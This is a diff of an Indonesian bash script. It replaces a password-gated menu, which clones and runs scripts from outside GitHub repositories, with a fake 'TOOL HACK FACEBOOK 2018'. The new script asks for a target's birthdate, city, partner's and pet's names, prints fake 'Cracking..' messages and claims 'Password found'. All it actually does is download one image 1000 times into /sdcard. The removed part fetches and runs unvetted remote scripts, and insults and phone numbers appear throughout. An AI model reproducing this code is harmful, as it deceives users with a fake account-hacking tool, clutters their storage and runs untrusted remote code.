@@ -1,165 +1,62 @@
-#Mau apa tolol??
-#recode?? Pm gw bangsat!!!!
-#gpp untuk niatnya cuman belajar
-blue='\033[34;1m'
-green='\033[32;1m'
-purple='\033[35;1m'
-cyan='\033[36;1m'
-red='\033[31;1m'
-white='\033[37;1m'
-yellow='\033[33;1m'
-clear
-toilet -f big -F gay "USER"
+#!/bin/bash
+#bash
+ec="echo -e"
+g="\033[32;1m"
+y="\033[33;1m"
+i="\033[34;1m"
+r="\033[35;1m"
+p="\033[37;1m"
+c="\033[36;1m"
+w="\033[39;1m"
+r2='\033[31m'
+
+$ec $c"      "
+$ec "$TOOL HACK FACEBOOK 2018"
+$ec "NICKNAME: Bahauddin Mr.B4h4'"
+$ec "bendokaton tayu pati jateng"
+$ec "CYBER NOOBS TAYU PATI"
+$ec "       "
+$ec "       "
+$ec "            "
+$ec $c"       "
+$ec "             ""
+$ec $c"       "
+$ec $c" "
+$ec $c""
+$ec $c""
+$ec $c""
+$ec $c""
+$ec $c""
+$ec $c"  
+$ec $i" 
+$ec $i"
+
 echo ""
-echo $green"MASUKAN USERNAME DENGAN BENAR"
-echo $red"KALAU TIDAK TAHU USERNAMENYA HUB GW"
-echo $yellow"Whatsapp : 085695570951"
+echo -e -n $i"["$w"?"$i"]"$w" Masukan id target"$r2" > "$w
+read id;
+echo -e -n $i"["$w"?"$i"]"$w" Masukan tgl lahir target"$r2" > "$w
+read tgl;
+echo -e -n $i"["$w"?"$i"]"$w" kota tinggal target"$r2" > "$w
+read kota;
+echo -e -n $i"["$w"?"$i"]"$w" nama komunitas target"$r2" > "$w
+read kota;
+echo -e -n $i"["$w"?"$i"]"$w" nama pacar target"$r2" > "$w
+read pacar;
+echo -e -n $i"["$w"?"$i"]"$w" nama peliharaan target"$r2" > "$w
+read pet;
+echo -e $i"["$w"*"$i"]"$w" Please wait.."
+sleep 2
+echo -e $i"["$w"*"$i"]"$w" Preparing.."
+sleep 10
+echo -e $i"["$w"*"$i"]"$w" Cracking.."
+sleep 10
+cd /sdcard
+
+for x in {1..1000}
+do
+ wget "https://pictr.com/images/2018/12/12/0wS6PP.jpg" -O hacked$x.jpg
+
+done
+echo -e $i"["$w"√"$i"]"$w" Password found.."
 echo ""
-echo $cyan"======================<USERNAME>======================"
-read -p"Masukan Username: " us
-if [ $us = "bahauddin" ];then
-sleep 1
-clear
-else
-clear
-toilet -f big -F gay "Salah"
-toilet -f big -F gay "Goblok"
-sleep 1
-clear
-sh pw+us.sh
-fi
-
-toilet -f big -F gay "PASWRD"
-echo ""
-echo $cyan"MASUKAN PASSWRD DGN BENAR"
-echo $purple"KALAU GK TAHU PASSWORDNYA HUB GW"
-echo $yellow"Whastapp : 085726833815"
-echo ""
-echo $green"======================PASSWORDNYA======================"
-read -p"Masukan Password: " pw
-if [ $pw = "ganteng" ];then
-sleep 1
-clear
-else
-clear
-toilet -f big -F gay "Salah"
-toilet -f big -F gay "pekok"
-sleep 1
-clear
-sh pw+us.sh
-fi
-
-toilet -f big -F gay "INDONESIAN CYBER"
-toilet -f big -F gay "Bahauddin Mr.B4h4'"
-toilet -f big -F gay "bendokaton tayu pati"
-echo $yellow"<[+]>====="$green"====="$purple"====="$red"====="$cyan"====="$blue"====="$white"====="$cyan"====="$red"=======>"
-echo $cyan"<[+]>Pembuat : Bahauddin" /$yellow"Bahauddin"
-echo $purple"<[+]>Team : D35TR0Y" $red"SQUAD"
-echo $green"<[+]>Alamat : INDONESIA "$blue"CYBER"
-echo $red"<[+]>Whast'app : "$yellow"085726833815"
-echo $white"<[+]>Status : SANTAI"$purple "GANTENG"$green "TERUS BELAJAR"
-echo $yellow"<[+]>====="$green"====="$purple"====="$red"====="$cyan"====="$blue"====="$white"====="$cyan"====="$red"=======>"
-echo ""
-echo ""
-echo ""
-echo $yellow"<[+]>====="$green"====="$purple"====="$red"====="$cyan"====="$blue"====="$white"====="$cyan"====="$red"=======>"
-echo $cyan"(1)SPECIAL THANKS FOR:"
-echo $yellow"<[+]>====="$green"====="$purple"====="$red"====="$cyan"====="$blue"====="$white"====="$cyan"====="$red"=======>"
-echo $cyan"(2)INSTALL TOOLS Bahauddin Versi:1"
-echo $yellow"<[+]>====="$green"====="$purple"====="$red"====="$cyan"====="$blue"====="$white"====="$cyan"====="$red"=======>"
-echo $cyan"(3)INSTALL TOOLS Bahauddin Versi:2"
-echo $yellow"<[+]>====="$green"====="$purple"====="$red"====="$cyan"====="$blue"====="$white"====="$cyan"====="$red"=======>"
-echo $cyan"(4)INSTALL TOOLS Bahauddin Versi:3"
-echo $yellow"<[+]>====="$green"====="$purple"====="$red"====="$cyan"====="$blue"====="$white"====="$cyan"====="$red"=======>"
-echo $cyan"(5)INSTALL TOOLS Bahauddin Versi:1"
-echo $yellow"<[+]>====="$green"====="$purple"====="$red"====="$cyan"====="$blue"====="$white"====="$cyan"====="$red"=======>"
-echo $cyan"(6)INSTALL TOOLS Bahauddin"
-echo $yellow"<[+]>====="$green"====="$purple"====="$red"====="$cyan"====="$blue"====="$white"====="$cyan"====="$red"=======>"
-echo $cyan"(88)KELUAR"
-echo $yellow"<[+]>====="$green"====="$purple"====="$red"====="$cyan"====="$blue"====="$white"====="$cyan"====="$red"=======>"
-echo ""
-read -p"Pilih No===>>: " bos
-
-if [ $bos = 1 ] || [ $bos = 1 ]
-then
-clear
-toilet -f big -F gay "Loading"
-echo "Cyb3r_Gh0st"|lolcat
-echo "M.A"|lolcat
-echo "Tyrexus"|lolcat
-echo "Mr.Explore57"|lolcat
-echo "25 jul|666 ghost"|lolcat
-echo "Adnstro"|lolcat
-echo "Mr.spoon"|lolcat
-echo "WANKONDEX"|lolcat
-echo "Raka"|lolcat
-echo "Safri"|lolcat
-echo "ALL MEMBER/ADMIN D35TR0Y SQUAD"|lolcat
-fi
-
-if [ $bos = 2 ] || [ $bos = 2 ]
-then
-clear
-toilet -f big -F gay "Menginstall..."
-git clone https://github.com/intect15/bima-jabang
-cd bima-jabang
-sh BIMA-JABANG#1.sh
-fi
-
-if [ $bos = 3 ] || [ $bos = 3 ]
-then
-clear
-toilet -f big -F gay "Menginstall..."
-git clone https://github.com/intect15/bimajabangversi2
-cd bimajabangversi2
-sh cyb3r_gh0stv2.sh
-fi
-
-if [ $bos = 4 ] || [ $bos = 4 ]
-then
-clear
-toilet -f big -F gay "Menginstall..."
-figlet dasar|lolcat
-figlet goblok!!|lolcat
-echo $cyan"Inilah tools versi 3 !!!!"
-fi
-
-if [ $bos = 5 ] || [ $bos = 5 ]
-then
-clear
-toilet -f big -F gay "Menginstall..."
-git clone https://github.com/cyberghost69/tyrexusV1
-cd tyrexusV1
-sh destroy.sh
-fi
-
-if [ $bos = 6 ] || [ $bos = 6 ]
-then
-clear
-toilet -f big -F gay "Menginstall..."
-git clone https://github.com/cyberghost69/KUBURAN-MANTAN
-cd KUBURAN-MANTAN
-sh kuburan-mantan.sh
-fi
-
-if [ $bos = 88 ] || [ $bos = 88 ]
-then
-clear
-figlet yakin?|lolcat
-read -p"Yakin ingin keluar? (y/t)=> " bos;
-fi
-
-if [ $bos = y ] || [ $bos = y ]
-then
-clear
-figlet Keluar|lolcat
-exit
-fi
-
-if [ $bos = t ] || [ $bos = t ]
-then
-clear
-figlet Auto|lolcat
-figlet Login|lolcat
-sh bima-bagus-jabang-v3.sh
-fi
+echo -e $i"["$w"√"$i"]"$w" Done please check file txt"
